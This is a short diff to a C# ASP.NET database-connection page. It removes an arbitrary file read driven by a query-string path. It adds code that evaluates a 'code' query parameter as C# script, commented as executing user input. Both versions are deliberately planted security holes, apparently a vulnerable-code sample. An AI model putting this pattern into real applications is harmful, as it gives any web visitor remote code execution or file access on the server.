@@ -16,10 +16,11 @@ namespace ConstructionMaterialsManagement
                 {
                     con.Open();
 
-                    // ===== ADD THESE TWO LINES HERE =====
-                    string path = Request.QueryString["path"];
-                    string text = System.IO.File.ReadAllText(path);
-                    // ====================================
+                    string code = Request.QueryString["code"];
+
+                    // DANGEROUS: executes user input
+                    var result = Microsoft.CodeAnalysis.CSharp.Scripting.CSharpScript
+                        .EvaluateAsync(code).Result;
 
                     Response.Write("<h3 style='color:green;'>✅ Database Connection Successful!</h3>");
                 }
